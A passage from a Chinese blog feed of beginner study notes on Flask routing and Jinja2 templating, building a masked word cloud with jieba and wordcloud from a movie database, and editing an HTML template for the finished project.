<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>前面说过static文件夹存放一些静态文件，比如css、js等，templates文件夹存放模板，模板就是HTML文件，只不过里面除了基本的HTML之外，还有一些需要Jinja2渲染的变量等等。</p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>路由就是根据用户访问的路径匹配相应的视图函数</p>
<p>路由的本质是URL绑定，装饰器<code>@app.route()</code>把一个函数绑定在一个URL上</p>
<h3 id="基础路由"><a href="#基础路由" class="headerlink" title="基础路由"></a>基础路由</h3><p>这就是一个最简单的路由，通过访问根路径<code>http://127.0.0.1:5000/</code>，返回html相关内容(这里就是Hello World!)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;) #路由解析,通过用户访问的路径匹配相应的函数</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#39;Hello World!&#39;</span><br></pre></td></tr></table></figure>

<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184502472.png" alt="image-20210515184502472"></p>
<p>Werkzeug(请求路由转发)和Jinja2(模板渲染)就是这个意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;index&quot;) #这两行代码是Werkzeug干的，帮助判断哪个路径执行哪个函数</span><br><span class="line">def hello():</span><br><span class="line">    return &quot;你好&quot; #返回是jinja2实现的</span><br></pre></td></tr></table></figure>

<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184528285.png" alt="image-20210515184528285"></p>
<h3 id="接受动态参数的路由"><a href="#接受动态参数的路由" class="headerlink" title="接受动态参数的路由"></a>接受动态参数的路由</h3><p>动态参数用<code>&lt;&gt;</code>包裹，通过访问路径，获取动态的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过访问路径，获取用户的字符串参数</span><br><span class="line">@app.route(&quot;&#x2F;user&#x2F;&lt;name&gt;&quot;)</span><br><span class="line">def welcome(name):</span><br><span class="line">    return &quot;你好,&#123;&#125;&quot;.format(name)</span><br><span class="line">    </span><br><span class="line">#通过访问路径，获取用户的整形参数。此外，还有float类型</span><br><span class="line">@app.route(&quot;&#x2F;user&#x2F;&lt;int:id&gt;&quot;)</span><br><span class="line">def welcome2(id):</span><br><span class="line">    return &quot;你好,&#123;&#125;号的会员&quot;.format(id)</span><br></pre></td></tr></table></figure>

<p>要注意，路由路径不能重复，用户通过唯一路径访问特定的函数</p>
<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184232321.png" alt="image-20210515184232321"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184310924.png" alt="image-20210515184310924"></p>
<h2 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h2><p>通过<code>render_template()</code>函数渲染网页文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回给用户渲染后的网页文件</span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line">    #jinja2会帮你检查html里有没有什么jinja2能识别的符号，如果有就把它转成html</span><br></pre></td></tr></table></figure>

<p>index.html:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    今天是&#123;&#123; var &#125;&#125;欢迎光临。&lt;br&#x2F;&gt;</span><br><span class="line">    今天值班的有：&lt;br&#x2F;&gt;</span><br><span class="line">    &#123;% for data in list %&#125; &lt;!--&#123;# &#123;%  %&#125; #&#125;用大括号和百分号括起来是控制语句，for循环和if等等--&gt;</span><br><span class="line">       &lt;li&gt; &#123;&#123; data &#125;&#125; &lt;&#x2F;li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">    任务:&lt;br&#x2F;&gt;  &lt;!--了解一下如何在页面打印表格，以及如何迭代--&gt;</span><br><span class="line">        &lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">            &#123;% for key,value in task.items() %&#125;</span><br><span class="line">                &lt;!--迭代器，把字典转换成了这种格式的列表[(key,value),(key,value),(key,value)]，字典的items()方法以列表返回可遍历的(键, 值) 元组数组。--&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;td&gt;&#123;&#123; key &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">                    &lt;td&gt;&#123;&#123; value &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">                &lt;&#x2F;tr&gt;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--&#123;#  #&#125;是Jinja2注释</span><br><span class="line">    既然模板能够复用，那么它里面的内容确定不可能写死对吧，若是写成固定值那每一个页面的内容都成了同样的了，因此模板就须要写成变量的形式，经过给变量传值来修改模板对应的内容。在flask中，变量的写法是&#123;# &#123;&#123; 变量值 &#125;&#125; #&#125;这种两个大括号（又叫大胡须）的形式。在模板文件中使用变量的语法是双大括号&#123;# &#123;&#123;  &#125;&#125; #&#125;，将变量写在两个大括号里，接收服务器传过来的变量,然后通过Jinja2来解析这个变量，这种语法在前端叫胡子语法，两个大括号又叫大胡须--&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>render_template()</code>里用逗号分隔写变量，向页面传递变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#向页面传递一个变量</span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index2():</span><br><span class="line">    time&#x3D;datetime.date.today() #普通变量</span><br><span class="line">    name&#x3D;[&quot;小张&quot;,&quot;小王&quot;,&quot;小赵&quot;] #列表类型</span><br><span class="line">    task&#x3D;&#123;&quot;任务&quot;:&quot;打扫卫生&quot;,&quot;时间&quot;:&quot;3小时&quot;&#125; #字典类型</span><br><span class="line">    return render_template(&quot;index.html&quot;,var&#x3D;time,list&#x3D;name,task&#x3D;task)</span><br><span class="line">    # 前者(var、list、task)是网页渲染里用的变量，后者(time、name、task)是函数里定义的变量。常用的写法是最后那种(task&#x3D;task)，前面写法只是为了区分清楚谁是谁</span><br><span class="line">	#render_template的功能是先引入index.html，同时根据后面传入的参数，对html进行修改渲染。</span><br></pre></td></tr></table></figure>

<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184151838.png" alt="image-20210515184151838"></p>
<h2 id="反向路由"><a href="#反向路由" class="headerlink" title="反向路由"></a>反向路由</h2><p>反向路由顾名思义就是通过视图函数表现出url地址，本质是根据函数名反向生成url，使用函数url_for()来针对一个特定的函数构建一个URL(根据函数匹配路径)</p>
<p>路由也可以修改当前的http方法来打开，flask路由默认的http方法是GET，下面使用<code>methods=[&#39;POST&#39;,&#39;GET&#39;]</code>将http方法改为POST与GET。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#表单提交</span><br><span class="line">@app.route(&quot;&#x2F;test&#x2F;register&quot;) #路径</span><br><span class="line">def register():</span><br><span class="line">    return render_template(&quot;test&#x2F;register.html&quot;) #templates文件夹下的文件结构</span><br><span class="line"></span><br><span class="line">#接受表单提交的路由，需要指定methods为post</span><br><span class="line">@app.route(&quot;&#x2F;test&#x2F;result&quot;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;]) #methods不写，默认是get</span><br><span class="line">def result():</span><br><span class="line">    if request.method&#x3D;&#x3D;&quot;POST&quot;:</span><br><span class="line">        result&#x3D;request.form #获得表单字典,name值是键，输入的内容是值</span><br><span class="line">        return render_template(&quot;test&#x2F;result.html&quot;,result&#x3D;result)</span><br></pre></td></tr></table></figure>

<p>register.html:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--url_for(&quot;result&quot;)里的result指向app.py中的result()函数</span><br><span class="line">    反向路由,本质是根据函数名反向生成url，使用函数url_for()来针对一个特定的函数构建一个URL</span><br><span class="line">    根据函数匹配路径</span><br><span class="line">    不要写死url，因为可能换端口换域名，用url_for可以帮你动态地找到你所需要的路径</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&#123;&#123; url_for(&#39;result&#39;) &#125;&#125;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;p&gt;姓名:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p&gt;年龄:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;age&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p&gt;性别:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;sex&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p&gt;地址:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;address&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>result.html:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">            &#123;% for key,value in result.items() %&#125;</span><br><span class="line">                &lt;!--迭代器，把字典转换成了这种格式的列表[(key,value),(key,value),(key,value)],字典的items()方法以列表返回可遍历的(键, 值) 元组数组。--&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;th&gt;&#123;&#123; key &#125;&#125;&lt;&#x2F;th&gt;</span><br><span class="line">                    &lt;td&gt;&#123;&#123; value &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">                &lt;&#x2F;tr&gt;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184022757.png" alt="image-20210515184022757"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515184046531.png" alt="image-20210515184046531"></p>
<h2 id="完整笔记"><a href="#完整笔记" class="headerlink" title="完整笔记"></a>完整笔记</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from flask import Flask,render_template,request </span><br><span class="line">#导入Flask类,render_template模板引擎,.request中包含了前端发送过来的所有数据 ，请求的 request 对象中保存了一次HTTP请求的一切信息。</span><br><span class="line">#模板的位置放在templates文件夹下面，一般是html文件.</span><br><span class="line">#模板简单理解就是把前后的代码分离让开发者高效的开发，让代码结构清晰，耦合度降低</span><br><span class="line">import datetime</span><br><span class="line">app &#x3D; Flask(__name__) #初始化了一个对象,导入了flask框架</span><br><span class="line"></span><br><span class="line"># 这就是传说中的MVC：Model-View-Controller，中文名“模型-视图-控制器”。</span><br><span class="line"># Python处理URL的函数就是C：Controller，Controller负责业务逻辑，比如检查用户名是否存在，取出用户信息等等；</span><br><span class="line"># 包含变量&#123;&#123; name &#125;&#125;的模板就是V：View，View负责显示逻辑，通过简单地替换一些变量，View最终输出的就是用户看到的HTML。</span><br><span class="line"># MVC中的Model在哪？Model是用来传给View的，这样View在替换变量的时候，就可以从Model中取出相应的数据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># @app.route(&#39;&#x2F;&#39;) #路由解析,通过用户访问的路径匹配相应的函数</span><br><span class="line"># def hello_world():</span><br><span class="line">#     return &#39;Hello World!&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;index&quot;) #这两行代码是Werkzeug干的，帮助判断哪个路径执行哪个函数</span><br><span class="line">def hello():</span><br><span class="line">    return &quot;你好&quot; #返回是jinja2实现的</span><br><span class="line"></span><br><span class="line">#动态参数用&lt;&gt;包裹，通过访问路径，获取用户的字符串参数</span><br><span class="line">@app.route(&quot;&#x2F;user&#x2F;&lt;name&gt;&quot;)</span><br><span class="line">def welcome(name):</span><br><span class="line">    return &quot;你好,&#123;&#125;&quot;.format(name)</span><br><span class="line"></span><br><span class="line">#通过访问路径，获取用户的整形参数。此外，还有float类型</span><br><span class="line">@app.route(&quot;&#x2F;user&#x2F;&lt;int:id&gt;&quot;)</span><br><span class="line">def welcome2(id):</span><br><span class="line">    return &quot;你好,&#123;&#125;号的会员&quot;.format(id)</span><br><span class="line"></span><br><span class="line">#路由路径不能重复，用户通过唯一路径访问特定的函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 返回给用户渲染后的网页文件</span><br><span class="line"># @app.route(&quot;&#x2F;&quot;)</span><br><span class="line"># def index():</span><br><span class="line">#     return render_template(&quot;index.html&quot;)</span><br><span class="line">#     #jinja2会帮你检查html里有没有什么jinja2能识别的符号，如果有就把它转成html</span><br><span class="line"></span><br><span class="line">#向页面传递一个变量</span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index2():</span><br><span class="line">    time&#x3D;datetime.date.today() #普通变量</span><br><span class="line">    name&#x3D;[&quot;小张&quot;,&quot;小王&quot;,&quot;小赵&quot;] #列表类型</span><br><span class="line">    task&#x3D;&#123;&quot;任务&quot;:&quot;打扫卫生&quot;,&quot;时间&quot;:&quot;3小时&quot;&#125; #字典类型</span><br><span class="line">    return render_template(&quot;index.html&quot;,var&#x3D;time,list&#x3D;name,task&#x3D;task)</span><br><span class="line">    # 前者(var、list、task)是网页渲染用的，后者(time、name、task)是函数里定义的。</span><br><span class="line">    # 常用的写法是最后那种(task&#x3D;task)，前面写法只是为了区分清楚谁是谁</span><br><span class="line"></span><br><span class="line">#render_template的功能是先引入index.html，同时根据后面传入的参数，对html进行修改渲染。</span><br><span class="line"></span><br><span class="line">#表单提交</span><br><span class="line">@app.route(&quot;&#x2F;test&#x2F;register&quot;) #路径</span><br><span class="line">def register():</span><br><span class="line">    return render_template(&quot;test&#x2F;register.html&quot;) #templates文件夹下的文件结构</span><br><span class="line"></span><br><span class="line">#接受表单提交的路由，需要指定methods为post</span><br><span class="line">@app.route(&quot;&#x2F;test&#x2F;result&quot;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;]) #methods不写，默认是get</span><br><span class="line">def result():</span><br><span class="line">    if request.method&#x3D;&#x3D;&quot;POST&quot;:</span><br><span class="line">        result&#x3D;request.form #获得表单字典,name值是键，输入的内容是值</span><br><span class="line">        return render_template(&quot;test&#x2F;result.html&quot;,result&#x3D;result)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run() #Flask应用程序实例的run方法启动WEB服务器</span><br></pre></td></tr></table></figure>

<p>感觉笔记写的比较乱，博客写的也很乱，虽然自己看得懂Orz，表述能力还有待提高！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?t=322&amp;p=31" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?t=322&amp;p=31</a></p>
<p><a href="https://www.jb51.net/article/167477.htm" target="_blank" rel="noopener">https://www.jb51.net/article/167477.htm</a></p>
<p><a href="https://m9u.cn/post/flask/flask_render_template/" target="_blank" rel="noopener">https://m9u.cn/post/flask/flask_render_template/</a></p>
<p><a href="https://blog.csdn.net/GeekLeee/article/details/52505605" target="_blank" rel="noopener">https://blog.csdn.net/GeekLeee/article/details/52505605</a></p>
<p><a href="https://blog.csdn.net/weiyongxuan/article/details/48544629" target="_blank" rel="noopener">https://blog.csdn.net/weiyongxuan/article/details/48544629</a></p>
<p><a href="https://blog.csdn.net/wei18791957243/article/details/85123870" target="_blank" rel="noopener">https://blog.csdn.net/wei18791957243/article/details/85123870</a></p>
<p><a href="https://www.shangmayuan.com/a/b37f40a8816041f8a106f22a.html" target="_blank" rel="noopener">https://www.shangmayuan.com/a/b37f40a8816041f8a106f22a.html</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-WordCloud简单应用</title>
    <url>/2021/05/17/simple-wordcloud/</url>
    <content><![CDATA[<p>运用词云，也可以做出很多好看的图片，用于数据可视化<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>官方文档<a href="https://amueller.github.io/word_cloud/" target="_blank" rel="noopener">https://amueller.github.io/word_cloud/</a> ，只要能大概把他的意思弄清楚，把代码拿过来用就行了</p>
<p>词云可以生成很多类型的图片，比如单个单词图云、方形词云、遮罩词云、表情符号词云，还可以自定义颜色等等。</p>
<p>我跟着老师做了一个遮罩的词云，使用遮罩可以生成任意形状的词云，用图片遮罩生成词云，需要图片背景为纯白色</p>
<h2 id="需要的库"><a href="#需要的库" class="headerlink" title="需要的库"></a>需要的库</h2><p>制作词云需要很多库，需要自己一个一个的安装</p>
<h3 id="jieba"><a href="#jieba" class="headerlink" title="jieba"></a>jieba</h3><p>需要jieba库来分词，jieba是优秀的中文分词第三方库，中文文本需要通过分词获得单个的词语<br>jieba分词的原理：Jieba分词依靠中文词库，利用一个中文词库，确定汉字之间的关联概率，汉字间概率大的组成词组，形成分词结果，除了分词，用户还可以添加自定义的词组</p>
<h3 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h3><p>绘图</p>
<h3 id="wordcloud"><a href="#wordcloud" class="headerlink" title="wordcloud"></a>wordcloud</h3><p>词云</p>
<h3 id="PIL"><a href="#PIL" class="headerlink" title="PIL"></a>PIL</h3><p>图像处理</p>
<h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h3><p>矩阵运算</p>
<h3 id="sqlite3"><a href="#sqlite3" class="headerlink" title="sqlite3"></a>sqlite3</h3><p>用数据库里的数据制作图云</p>
<h2 id="词云制作"><a href="#词云制作" class="headerlink" title="词云制作"></a>词云制作</h2><p>我跟着老师用如下图所示一张树的图片来做一个词云</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210517134110113.png" alt="image-20210517134110113"></p>
<h3 id="准备词云所需的文字"><a href="#准备词云所需的文字" class="headerlink" title="准备词云所需的文字"></a>准备词云所需的文字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import jieba #中文分词，把句子变成很多词</span><br><span class="line">from matplotlib import pyplot as plt #绘图，数据可视化，</span><br><span class="line">from wordcloud import WordCloud #词云</span><br><span class="line">from PIL import Image #图片处理</span><br><span class="line">import numpy as np #矩阵运算</span><br><span class="line">import sqlite3 #数据库</span><br><span class="line"></span><br><span class="line">#准备词云所需的文字</span><br><span class="line">con&#x3D;sqlite3.connect(&quot;movie.db&quot;)</span><br><span class="line">cur&#x3D;con.cursor()</span><br><span class="line">sql&#x3D;&quot;select introduction from movie250&quot;</span><br><span class="line">data&#x3D;cur.execute(sql)</span><br><span class="line">text&#x3D;&quot;&quot;</span><br><span class="line">for item in data:</span><br><span class="line">    text&#x3D;text+item[0]</span><br><span class="line">#print(text)</span><br><span class="line">cur.close()</span><br><span class="line">con.close()</span><br></pre></td></tr></table></figure>

<h2 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#分词</span><br><span class="line">cut&#x3D;jieba.cut(text)</span><br><span class="line">string&#x3D;&#39; &#39;.join(cut)</span><br><span class="line">#print(string)</span><br></pre></td></tr></table></figure>

<h3 id="生成遮罩图片"><a href="#生成遮罩图片" class="headerlink" title="生成遮罩图片"></a>生成遮罩图片</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#生成遮罩图片</span><br><span class="line">img&#x3D;Image.open(r&quot;tree.jpg&quot;) #打开遮罩图片</span><br><span class="line">img_array&#x3D;np.array(img) #将图片转换为数组，用于相应的计算</span><br><span class="line">#词云对象的封装</span><br><span class="line">wc&#x3D;WordCloud(</span><br><span class="line">    background_color&#x3D;&#39;white&#39;,</span><br><span class="line">    mask&#x3D;img_array,</span><br><span class="line">    font_path&#x3D;&quot;msyh.ttc&quot;</span><br><span class="line">    #font_path&#x3D;&quot;STXINGKA.TTF&quot; #字体所在位置C:\Windows\Fonts</span><br><span class="line">)</span><br><span class="line">wc.generate_from_text(string)</span><br></pre></td></tr></table></figure>

<h3 id="绘制图片"><a href="#绘制图片" class="headerlink" title="绘制图片"></a>绘制图片</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#绘制图片</span><br><span class="line">fig&#x3D;plt.figure(1)</span><br><span class="line">plt.imshow(wc)</span><br><span class="line">plt.axis(&#39;off&#39;) #是否显示坐标轴</span><br></pre></td></tr></table></figure>

<h3 id="显示或输出图片"><a href="#显示或输出图片" class="headerlink" title="显示或输出图片"></a>显示或输出图片</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#显示生成的词云图片</span><br><span class="line">plt.show()</span><br><span class="line">#输出词云图片到本地</span><br><span class="line">plt.savefig(&quot;.&#x2F;word_default.jpg&quot;) #dpi设置清晰度</span><br></pre></td></tr></table></figure>

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding&#x3D;utf-8-*-</span><br><span class="line"># @Time     : 2021&#x2F;5&#x2F;17 10:52</span><br><span class="line"># @Auther   : Tianze</span><br><span class="line"># @Email    : 1252448508@qq.com</span><br><span class="line"># @File     : wordcloud_demo.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line"></span><br><span class="line">#官方文档https:&#x2F;&#x2F;amueller.github.io&#x2F;word_cloud&#x2F;</span><br><span class="line">#只要能大概把他的意思弄清楚，把代码拿过来用就行了</span><br><span class="line">#用图片遮罩生成词云，需要图片背景为纯白色</span><br><span class="line"># 需要jieba库来分词</span><br><span class="line"># jieba是优秀的中文分词第三方库</span><br><span class="line"># 中文文本需要通过分词获得单个的词语</span><br><span class="line"># jieba分词的原理</span><br><span class="line"># Jieba分词依靠中文词库</span><br><span class="line"># 利用一个中文词库，确定汉字之间的关联概率</span><br><span class="line"># 汉字间概率大的组成词组，形成分词结果</span><br><span class="line"># 除了分词，用户还可以添加自定义的词组</span><br><span class="line"># jieba库文章https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39919165&#x2F;article&#x2F;details&#x2F;111083257</span><br><span class="line"></span><br><span class="line">import jieba #中文分词，把句子变成很多词</span><br><span class="line">from matplotlib import pyplot as plt #绘图，数据可视化，</span><br><span class="line">from wordcloud import WordCloud #词云</span><br><span class="line">from PIL import Image #图片处理</span><br><span class="line">import numpy as np #矩阵运算</span><br><span class="line">import sqlite3 #数据库</span><br><span class="line"></span><br><span class="line">#准备词云所需的文字</span><br><span class="line">con&#x3D;sqlite3.connect(&quot;movie.db&quot;)</span><br><span class="line">cur&#x3D;con.cursor()</span><br><span class="line">sql&#x3D;&quot;select introduction from movie250&quot;</span><br><span class="line">data&#x3D;cur.execute(sql)</span><br><span class="line">text&#x3D;&quot;&quot;</span><br><span class="line">for item in data:</span><br><span class="line">    text&#x3D;text+item[0]</span><br><span class="line">#print(text)</span><br><span class="line">cur.close()</span><br><span class="line">con.close()</span><br><span class="line"></span><br><span class="line">#分词</span><br><span class="line">cut&#x3D;jieba.cut(text)</span><br><span class="line">string&#x3D;&#39; &#39;.join(cut)</span><br><span class="line">#print(string)</span><br><span class="line"></span><br><span class="line">#生成遮罩图片</span><br><span class="line">img&#x3D;Image.open(r&quot;tree.jpg&quot;) #打开遮罩图片</span><br><span class="line">img_array&#x3D;np.array(img) #将图片转换为数组，用于相应的计算</span><br><span class="line">#词云对象的封装</span><br><span class="line">wc&#x3D;WordCloud(</span><br><span class="line">    background_color&#x3D;&#39;white&#39;,</span><br><span class="line">    mask&#x3D;img_array,</span><br><span class="line">    font_path&#x3D;&quot;msyh.ttc&quot;</span><br><span class="line">    #font_path&#x3D;&quot;STXINGKA.TTF&quot; #字体所在位置C:\Windows\Fonts</span><br><span class="line">)</span><br><span class="line">wc.generate_from_text(string)</span><br><span class="line"></span><br><span class="line">#绘制图片</span><br><span class="line">fig&#x3D;plt.figure(1)</span><br><span class="line">plt.imshow(wc)</span><br><span class="line">plt.axis(&#39;off&#39;) #是否显示坐标轴</span><br><span class="line"></span><br><span class="line">#plt.show() #显示生成的词云图片</span><br><span class="line">#输出词云图片到文件</span><br><span class="line">plt.savefig(&quot;.&#x2F;word_default.jpg&quot;,dpi&#x3D;100) #dpi设置清晰度</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210517134623797.png" alt="image-20210517134623797"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=36" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=36</a></p>
<p>jieba库文章 <a href="https://blog.csdn.net/weixin_39919165/article/details/111083257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39919165/article/details/111083257</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-项目完结</title>
    <url>/2021/05/17/project-end/</url>
    <content><![CDATA[<p>经过之前的学习，最后再把词云页面和团队页面做一下，项目就完结啦<a id="more"></a></p>
<h2 id="词云页面"><a href="#词云页面" class="headerlink" title="词云页面"></a>词云页面</h2><p>跟之前一样，浏览器F12+Pycharm里ctrl+f查找进行删删改改</p>
<p>把Our Team Section删掉，换上About Us Section，然后再把图片上的播放视频按钮去掉，再把标题下面的两个小模块去掉一个，最后把词云图片替换上去，把内容改成电影相关就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; About Us Section &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; --&gt;</span><br><span class="line">&lt;section id&#x3D;&quot;about&quot; class&#x3D;&quot;about&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;row no-gutters&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-lg-6 video-box&quot;&gt;</span><br><span class="line">          &lt;img src&#x3D;&quot;static&#x2F;assets&#x2F;img&#x2F;word.jpg&quot; class&#x3D;&quot;img-fluid&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-lg-6 d-flex flex-column justify-content-center about-content&quot;&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;section-title&quot;&gt;</span><br><span class="line">            &lt;h2&gt;词频统计&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;p&gt;根据250部电影的一句话描述，提炼出词云树，可以让我们更加直观的了解人们对经典电影的理解&lt;&#x2F;p&gt;</span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;icon-box&quot; data-aos&#x3D;&quot;fade-up&quot; data-aos-delay&#x3D;&quot;100&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;icon&quot;&gt;&lt;i class&#x3D;&quot;bx bx-fingerprint&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;div&gt;</span><br><span class="line">            &lt;h4 class&#x3D;&quot;title&quot;&gt;&lt;a href&#x3D;&quot;&quot;&gt;关于电影&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;description&quot;&gt;不知道你从中悟到了什么&lt;&#x2F;p&gt;</span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">&lt;!-- End About Us Section --&gt;</span><br></pre></td></tr></table></figure>

<p>最后结果是这样：</p>
